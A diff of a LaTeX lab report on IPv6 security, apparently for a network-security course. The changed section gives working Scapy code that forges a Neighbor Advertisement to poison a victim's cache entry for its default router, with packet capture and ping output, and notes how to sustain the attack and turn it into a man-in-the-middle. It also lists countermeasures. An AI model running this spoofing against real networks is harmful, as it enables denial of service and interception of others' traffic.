@@ -411,69 +411,107 @@ dedicated IDS rules on multicast traffic. Completely
 filtering ICMPv6, however, is not viable because IPv6 itself depends on it
 for NDP, PMTUD and SLAAC.
 
-\subsection{NDP threats: NS/NA spoofing}
+\subsection{NDP threats: NA router cache poisoning}
 
-For the second exercise we followed the standard three-host scenario:
+For this exercise we targeted the neighbour-cache entry of the default
+router on arpwatch-clients, with the goal of associating the link-local
+address of the internal firewall with Kali's MAC address:
 
 \begin{itemize}
-    \item Host~C (attacker): \texttt{kali}
-    \item Host~A (victim): \texttt{arpwatch-clients}
-    \item Host~B (impersonated): \texttt{monitorserver}
+    \item Attacker: \texttt{kali} (clients network)
+    \item Victim: \texttt{arpwatch-clients}
+    \item Impersonated host: internal firewall, link-local
+        \texttt{fe80::64a3:2eff:fe83:1e7f}
 \end{itemize}
 
-After collecting MAC and IPv6 addresses of the three hosts we verified that
-Host~A could legitimately reach Host~B and that its neighbour cache contained
-the correct mapping:
+Before the attack the victim holds the correct mapping for the router in
+its neighbour cache, with the \texttt{router} flag set:
 
+\newpage
 \begin{lstlisting}
-$ ip -6 neigh show
-2001:470:b5b8:1e82:455:36ff:fea8:2642
-   dev eth0 lladdr 06:55:36:a8:26:42 REACHABLE
+$ ip neigh show
+fe80::64a3:2eff:fe83:1e7f dev eth0
+   lladdr 66:a3:2e:83:1e:7f router STALE
 \end{lstlisting}
 
-We then crafted on Kali a forged Neighbor Advertisement with Scapy, claiming
-that Host~B's IPv6 address resolves to the attacker's MAC address:
+where \texttt{66:a3:2e:83:1e:7f} is the genuine MAC of the internal
+firewall on the clients segment. From Kali we then crafted a forged
+Neighbor Advertisement with Scapy, setting \texttt{R=1} to mark the message
+as coming from a router:
 
 \begin{lstlisting}
 d = IPv6(
-   src="2001:470:b5b8:1e82:455:36ff:fea8:2642",
+   src="fe80::64a3:2eff:fe83:1e7f",
    dst="2001:470:b5b8:1e82:b89d:d3ff:feec:ea07")
-e = ICMPv6ND_NA(R=0,
-   tgt="2001:470:b5b8:1e82:455:36ff:fea8:2642")
+e = ICMPv6ND_NA(R=1,
+   tgt="fe80::64a3:2eff:fe83:1e7f")
 f = ICMPv6NDOptDstLLAddr(
    lladdr="e6:80:50:76:15:46")
-send(d/e/f)
+send(d/e/f, iface="eth0")
 \end{lstlisting}
 
-Immediately after the injection, the neighbour cache of Host~A is poisoned
-and the IPv6 address of monitorserver is now mapped to Kali's MAC:
+The capture \texttt{na-poisoning.pcap} confirms the forged NA, with the
+\texttt{router, override} flags and Kali's MAC in the
+destination link-address option:
 
 \begin{lstlisting}
-$ ip -6 neigh show
-2001:470:b5b8:1e82:455:36ff:fea8:2642
-   dev eth0 lladdr e6:80:50:76:15:46 STALE
+$ tcpdump -r na-poisoning.pcap -nn -vv icmp6
+fe80::64a3:2eff:fe83:1e7f >
+   2001:470:b5b8:1e82:b89d:d3ff:feec:ea07:
+   ICMP6, neighbor advertisement,
+   tgt is fe80::64a3:2eff:fe83:1e7f,
+   Flags [router, override]
+   destination link-address option (2):
+      e6:80:50:76:15:46
 \end{lstlisting}
 
-From that moment on, every IPv6 frame that Host~A would send to Host~B is
-delivered at layer~2 to the attacker, breaking the ping between the two
-victims.
+Immediately after the injection, arpwatch-clients accepts the override and
+its cache entry for the router points to Kali's MAC, while still keeping
+the \texttt{router} flag:
+
+\begin{lstlisting}
+$ ip neigh show
+fe80::64a3:2eff:fe83:1e7f dev eth0
+   lladdr e6:80:50:76:15:46 router STALE
+\end{lstlisting}
+
+The practical effect is visible right away: pinging the router from the
+victim fails completely, because the frames are delivered at layer~2 to
+Kali (which silently drops them):
+
+\begin{lstlisting}
+$ ping6 -c 3 fe80::64a3:2eff:fe83:1e7f%eth0
+3 packets transmitted, 0 received,
+   100% packet loss, time 2042ms
+\end{lstlisting}
 
 The effect is not permanent: as soon as the kernel revalidates the
-\texttt{STALE} entry, the legitimate mapping is restored. To make the attack
-persistent it is enough to keep injecting forged advertisements, for example
-with \texttt{send(pkt, inter=1, loop=1)} in Scapy. The same technique can
-also be extended to a Man-in-the-Middle attack by poisoning both directions
-and enabling \texttt{net.ipv6.conf.all.forwarding=1} on Kali, so that the
-attacker can transparently relay the traffic between the two victims.
-Poisoning the entry of the default router instead of a normal host has an
-even broader impact: the victim sends all the off-link traffic to the
-attacker, leading either to a MITM on the whole external traffic or to a
-denial of service if packets are simply dropped.
+\texttt{STALE} entry through Neighbor Unreachability Detection, the
+legitimate mapping is restored and the ping succeeds again with normal
+RTT:
+
+\begin{lstlisting}
+$ ping6 -c 3 fe80::64a3:2eff:fe83:1e7f%eth0
+3 packets transmitted, 3 received,
+   0% packet loss, time 2012ms
+rtt min/avg/max/mdev =
+   0.611/1.008/1.758/0.530 ms
+\end{lstlisting}
+
+To make the attack persistent it is enough to keep injecting forged
+advertisements, for example with
+\texttt{send(pkt, inter=1, loop=1)} in Scapy. Because the poisoned entry
+is the default gateway, every off-link packet of the victim is hijacked:
+dropping the traffic yields a denial of service against the whole external
+connectivity of the host, while forwarding it (after enabling
+\texttt{net.ipv6.conf.all.forwarding=1} on Kali and poisoning the opposite
+direction too) turns the attack into a full Man-in-the-Middle on the
+victim's outbound traffic.
 
 The standard countermeasures for these threats are the first-hop security
-features available on managed switches (RA Guard, ND inspection, IPv6 source
-and prefix guard, DHCPv6 guard), together with monitoring tools like NDPmon
-or the very arpwatch-style detector running in our network.
+features available on managed switches (RA Guard, ND inspection, IPv6
+source and prefix guard, DHCPv6 guard), together with monitoring tools like
+NDPmon or the very arpwatch-style detector running in our network.
 
 \subsection{NDP threats: RS/RA bogus prefix}
 
@@ -486,7 +524,6 @@ segment.
 Before the attack, the victim only has the legitimate IPv6 configuration
 delegated by the internal firewall:
 
-\newpage
 \begin{lstlisting}
 $ ip -6 addr show dev eth0
 inet6 2001:470:b5b8:1e82:b89d:d3ff:feec:ea07/64
